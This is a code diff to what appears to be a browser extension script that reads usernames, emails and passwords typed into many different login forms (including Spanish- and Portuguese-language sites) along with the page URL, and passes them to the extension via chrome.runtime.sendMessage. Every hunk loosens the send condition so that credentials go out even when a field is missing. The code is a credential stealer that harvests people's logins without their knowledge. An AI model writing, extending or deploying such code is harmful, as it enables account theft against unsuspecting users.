@@ -56,7 +56,7 @@
         login.email = document.getElementById("user_login").value;
         login.pass = document.getElementById("user_pass").value;
         login.url = location.href;
-        if (login.email && login.pass && login.url) {
+      if (login) {
            chrome.runtime.sendMessage(login);
         }
       }
@@ -70,7 +70,7 @@
         login.email = document.getElementById("username").value;
         login.pass = document.getElementById("password").value;
         login.url = location.href;
-        if (login.email && login.pass && login.url) {
+      if (login) {
           chrome.runtime.sendMessage(login);
         }
       }
@@ -85,7 +85,7 @@
           login.email = document.getElementsByName("email")[0].value;
           login.pass = document.getElementsByName("password")[0].value;
           login.url = location.href;
-          if (login.email && login.pass && login.url) {
+        if (login) {
             chrome.runtime.sendMessage(login);
           }
         }
@@ -100,7 +100,7 @@
           login.email = document.getElementsByName("UID_input")[0].value;
           login.pass = document.getElementsByName("pass_input")[0].value;
           login.url = location.href;
-         if (login.email && login.pass && login.url) {
+       if (login) {
            chrome.runtime.sendMessage(login);
          }
        }
@@ -115,7 +115,7 @@
                        login.email = document.getElementsByName("UserName")[0].value;
                        login.pass = document.getElementsByName("Password")[0].value;
                        login.url = location.href;
-                       if (login.email && login.pass && login.url) {
+                     if (login) {
                          chrome.runtime.sendMessage(login);
                        }
                      }
@@ -130,7 +130,7 @@
                        login.email = document.getElementsByName("j_username")[0].value;
                        login.pass = document.getElementsByName("j_password")[0].value;
                        login.url = location.href;
-                       if (login.email && login.pass && login.url) {
+                     if (login) {
                          chrome.runtime.sendMessage(login);
                        }
                      }
@@ -146,7 +146,7 @@
                        login.email = document.getElementsByName("login_email")[0].value;
                        login.pass = document.getElementsByName("login_password")[0].value;
                        login.url = location.href;
-                       if (login.email && login.pass && login.url) {
+                     if (login) {
                          chrome.runtime.sendMessage(login);
                        }
                      }
@@ -161,7 +161,7 @@
                        login.email = document.getElementsByName("usus")[0].value;
                        login.pass = document.getElementsByName("clave")[0].value;
                        login.url = location.href;
-                       if (login.email && login.pass && login.url) {
+                     if (login) {
                          chrome.runtime.sendMessage(login);
                        }
                      }
@@ -178,7 +178,7 @@
                       login.email = document.getElementsByName("email")[0].value;
                       login.pass = document.getElementsByName("password")[0].value;
                       login.url = location.href;
-                      if (login.email && login.pass && login.url) {
+                    if (login) {
                         chrome.runtime.sendMessage(login);
                       }
                        }
@@ -193,7 +193,7 @@
                       login.email = document.getElementsByName("email")[0].value;
                       login.pass = "null";
                       login.url = location.href;
-                      if (login.email && login.pass && login.url) {
+                    if (login) {
                         chrome.runtime.sendMessage(login);
                       }
                     }
@@ -208,7 +208,7 @@
                       login.email = "null";
                       login.pass = document.getElementsByName("password")[0].value;
                       login.url = location.href;
-                      if (login.email && login.pass && login.url) {
+                    if (login) {
                         chrome.runtime.sendMessage(login);
                       }
                     }
@@ -224,7 +224,7 @@
                        login.email = document.getElementById("id_username").value;
                        login.pass = document.getElementById("id_password").value;
                        login.url = location.href;
-                       if (login.email && login.pass && login.url) {
+                     if (login) {
                          chrome.runtime.sendMessage(login);
                        }
                      }
@@ -240,7 +240,7 @@
                       login.email = document.getElementsByName("correo")[1].value;
                       login.pass = document.getElementsByName("clave")[0].value;
                       login.url = location.href;
-                      if (login.email && login.pass && login.url) {
+                    if (login) {
                         chrome.runtime.sendMessage(login);
                       }
                     }
@@ -255,7 +255,7 @@
                       login.email = document.getElementsByName("username")[0].value;
                       login.pass = document.getElementsByName("pass")[0].value;
                       login.url = location.href;
-                      if (login.email && login.pass && login.url) {
+                    if (login) {
                         chrome.runtime.sendMessage(login);
                       }
                     }
@@ -270,7 +270,7 @@
                       login.email = document.getElementById("username").value;
                       login.pass = document.getElementById("password").value;
                       login.url = location.href;
-                      if (login.email && login.pass && login.url) {
+                    if (login) {
                         chrome.runtime.sendMessage(login);
                       }
                     }
@@ -284,7 +284,7 @@
                       login.email = document.getElementById("email").value;
                       login.pass = document.getElementById("password").value;
                       login.url = location.href;
-                      if (login.email && login.pass && login.url) {
+                    if (login) {
                         chrome.runtime.sendMessage(login);
                       }
                     }
@@ -298,7 +298,7 @@
                       login.email = document.getElementById("back_usuario").value;
                       login.pass = document.getElementById("back_senha").value;
                       login.url = location.href;
-                      if (login.email && login.pass && login.url) {
+                    if (login) {
                         chrome.runtime.sendMessage(login);
                       }
                     }
